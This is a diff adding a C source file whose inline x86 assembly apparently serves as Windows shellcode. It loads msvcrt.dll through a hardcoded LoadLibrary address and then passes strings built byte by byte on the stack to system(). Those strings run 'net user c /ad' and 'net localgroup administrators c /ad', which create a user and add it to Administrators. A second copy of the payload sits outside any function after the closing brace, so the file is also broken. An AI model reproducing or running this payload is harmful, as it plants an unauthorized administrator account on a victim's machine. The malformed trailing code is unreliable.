@@ -1,0 +1,124 @@
+#include <windows.h>
+#include <winbase.h>
+void main()
+{
+			__asm
+			{
+			push ebp    ;
+			mov ebp,esp    ;
+			xor eax,eax   ;
+			push eax;
+			push eax;
+			push eax;
+			mov byte ptr [ebp-0bh],6Dh; 
+			mov byte ptr [ebp-0ah],73h;
+			mov byte ptr [ebp-09h],76h;
+			mov byte ptr [ebp-08h],63h;
+			mov byte ptr [ebp-07h],72h;
+			mov byte ptr [ebp-06h],74h;
+			mov byte ptr [ebp-05h],2Eh;
+			mov byte ptr [ebp-04h],64h;
+			mov byte ptr [ebp-03h],6Ch;
+			mov byte ptr [ebp-02h],6Ch;
+			lea eax,[ebp-0bh]; 
+			push eax    ;
+			mov eax,0x7c801d7b;
+			call eax  ; 
+			
+			mov esp,ebp ;     
+			push ebp ;    
+			mov ebp,esp ;      
+			xor edi,edi ;
+			push edi ; 
+			push edi
+			push edi
+			push edi ;   
+			mov byte ptr [ebp-0Fh],6eh ;n
+			mov byte ptr [ebp-0eh],65h ;e 
+			mov byte ptr [ebp-0dh],74h ;t
+			mov byte ptr [ebp-0ch],20h ;
+			mov byte ptr [ebp-0bh],75h ;u
+			mov byte ptr [ebp-0ah],73h ;s
+			mov byte ptr [ebp-09h],65h ;e
+			mov byte ptr [ebp-08h],72h ;r
+			mov byte ptr [ebp-07h],20h ;
+			mov byte ptr [ebp-06h],63h ;c
+			mov byte ptr [ebp-05h],20h ;
+			mov byte ptr [ebp-04h],2Fh ;/
+			mov byte ptr [ebp-03h],61h ;a
+			mov byte ptr [ebp-02h],64h ;d
+			mov byte ptr [ebp-01h],0h ;0
+
+			lea eax,[ebp-0fh] ;
+			push eax ;              
+			mov eax, 0x77bf93c7 ;        
+			call eax ;                              
+	
+			push ebp ;	
+			mov ebp,esp ;	
+			xor eax,eax ;
+			push eax;
+			mov byte ptr [ebp-24h],6eh ;n
+			mov byte ptr [ebp-23h],65h ;e
+			mov byte ptr [ebp-22h],74h ;t
+			mov byte ptr [ebp-21h],20h ;
+			mov byte ptr [ebp-20h],6ch ;l
+			mov byte ptr [ebp-1Fh],6Fh ;o
+			mov byte ptr [ebp-1eh],63h ;c
+			mov byte ptr [ebp-1dh],61h ;a
+			mov byte ptr [ebp-1ch],6ch ;l
+			mov byte ptr [ebp-1bh],67h ;g
+			mov byte ptr [ebp-1ah],72h ;r
+			mov byte ptr [ebp-19h],6Fh ;o
+			mov byte ptr [ebp-18h],75h ;u
+			mov byte ptr [ebp-17h],70h ;p
+			mov byte ptr [ebp-16h],20h ;
+			mov byte ptr [ebp-15h],61h ;a
+			mov byte ptr [ebp-14h],64h ;d
+			mov byte ptr [ebp-13h],6dh ;m
+			mov byte ptr [ebp-12h],69h ;i
+			mov byte ptr [ebp-11h],6eh ;n
+			mov byte ptr [ebp-10h],69h ;i
+			mov byte ptr [ebp-0Fh],73h ;s
+			mov byte ptr [ebp-0eh],74h ;t
+			mov byte ptr [ebp-0dh],72h ;r
+			mov byte ptr [ebp-0ch],61h ;a
+			mov byte ptr [ebp-0bh],74h ;t
+			mov byte ptr [ebp-0ah],6fh ;o
+			mov byte ptr [ebp-09h],72h ;r
+			mov byte ptr [ebp-08h],73h ;s
+			mov byte ptr [ebp-07h],20h ;
+			mov byte ptr [ebp-06h],64h ;d
+			mov byte ptr [ebp-05h],20h ;
+			mov byte ptr [ebp-04h],2Fh ;/
+			mov byte ptr [ebp-03h],61h ;a
+			mov byte ptr [ebp-02h],64h ;d
+			mov byte ptr [ebp-01h],0h ;0
+			
+			lea eax,[ebp-24h] ;
+			push eax ;
+			mov eax, 0x77bf93c7 ;
+			call eax ;
+	}
+}
+					push ebp ;	
+					mov ebp,esp ;	
+					xor eax,eax ;
+					push eax;
+					
+					push 0x6464612f;
+					push 0x20632073
+					push 0x726f7461
+					push 0x72747369
+					push 0x6e696d64
+					push 0x61207075
+					push 0x6f72676c
+					push 0x61636f6c
+					push 0x2074656e
+					
+					lea eax,[ebp-28h] ;
+					push eax ;
+					mov eax, 0x77bf93c7 ;
+					call eax ;
+					
+					
